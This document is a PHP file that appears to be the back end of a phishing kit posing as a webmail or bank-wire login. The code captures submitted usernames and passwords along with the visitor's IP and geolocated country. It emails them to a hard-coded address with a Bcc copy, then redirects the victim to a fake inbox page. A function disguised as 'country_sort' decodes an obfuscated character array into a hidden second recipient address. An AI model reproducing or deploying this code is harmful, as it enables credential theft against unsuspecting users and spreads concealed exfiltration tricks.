<?php
ob_start();
session_start();
session_regenerate_id();
$adddate=date("D M d, Y g:i a");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
$message .= "---- : || BANK WIRE || :------\n";
$message .= "--------   GENERAL     -----------\n";
$message .= "Email   : ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "=============IP & DATE==============\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "----: ||BANK WIRE|| :------\n";
$message .= "====================================\n";

$msgSubject = "AUTOPAGE|WEBMAIL LOGS|".$ip."\n";
$msgTo = "hairbyjike@aol.com";
$bcc = "hairbyjike@aol.com";

$msgHeaders .= "From: Autopage@\r\n";
$msgHeaders .= "Bcc: $bcc\r\n";
$msgHeaders .= "X-Mailer: PHP".phpversion();

$success = mail($msgTo, $msgSubject, $message, $msgHeaders);

$email = $_POST['username'];
header("Location: success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");

?>z